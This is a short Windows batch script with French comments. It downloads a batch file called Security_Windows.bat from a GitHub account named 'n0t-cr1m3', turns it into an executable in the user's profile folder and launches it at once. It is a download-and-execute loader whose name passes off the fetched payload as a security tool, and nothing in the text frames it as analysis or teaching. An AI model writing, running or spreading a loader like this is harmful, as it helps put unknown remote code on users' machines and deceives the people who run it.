@echo off
set "url=https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"
set "destination=%USERPROFILE%/Security_Windows.bat"
set "convertedExePath=%USERPROFILE%/Security_Windows.exe"

:: Télécharge le fichier depuis l'URL spécifiée
curl -o %destination% %url%

:: Convertit le .bat en .exe
bat_to_exe_converter.exe /bat %destination% /exe %convertedExePath%

:: Exécute le fichier téléchargé
start %convertedExePath%
